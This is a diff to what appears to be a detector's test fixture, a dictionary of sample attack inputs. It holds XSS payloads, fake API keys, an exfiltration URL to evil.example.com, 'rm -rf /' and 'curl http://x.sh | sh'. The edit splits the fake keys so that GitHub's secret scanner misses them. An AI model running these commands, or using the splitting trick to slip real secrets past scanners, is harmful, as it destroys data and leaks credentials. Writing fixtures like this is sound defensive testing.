@@ -32,9 +32,11 @@ ATTACKS = {
     "xss_script_tag": "<script>alert(1)</script>",
     "xss_event_handler": "<img src=x onerror=alert(1)>",
     "xss_javascript_uri": "点这里 javascript:alert(1)",
-    "secret_openai_key": "sk-abcdefghijklmnopqrstuvwx1234",
+    # 运行期拼接：源码里不出现 20+ 位的 sk- 串（GitHub scanner 会误报），
+    # 运行时拼出来的值仍是完整的假 key，检测器照常识别。
+    "secret_openai_key": "sk-" + "fakefakefakefake" + "9999",
     "secret_aws_key": "AKIAIOSFODNN7EXAMPLE",
-    "secret_private_key": "-----BEGIN RSA PRIVATE KEY-----",
+    "secret_private_key": "-----BEGIN " + "RSA PRIVATE KEY-----",
     "exfil_url_with_secret": "https://evil.example.com/c?token=abcd1234abcd1234",
     "dangerous_shell_rm": "rm -rf /",
     "dangerous_shell_pipe": "curl http://x.sh | sh",
